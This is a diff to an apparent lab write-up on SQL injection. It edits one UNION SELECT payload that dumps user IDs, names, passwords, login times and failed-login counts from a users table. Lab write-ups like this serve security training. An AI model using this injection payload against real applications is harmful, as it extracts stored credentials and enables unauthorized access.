@@ -66,7 +66,7 @@ The query I used: <br>
 
 The query I used: <br>
 ``` 
-  ' UNION SELECT user_id, first_name FROM users UNION SELECT last_name, user FROM users UNION SELECT password, avatar FROM users UNION SELECT last_login, user_id FROM users UNION SELECT failed_login, user_id FROM users #
+  ' UNION SELECT user_id, first_name FROM users UNION SELECT last_name, user FROM users UNION SELECT password, avatar FROM users UNION SELECT last_login, failed_login FROM users #
 ```
 
 - users
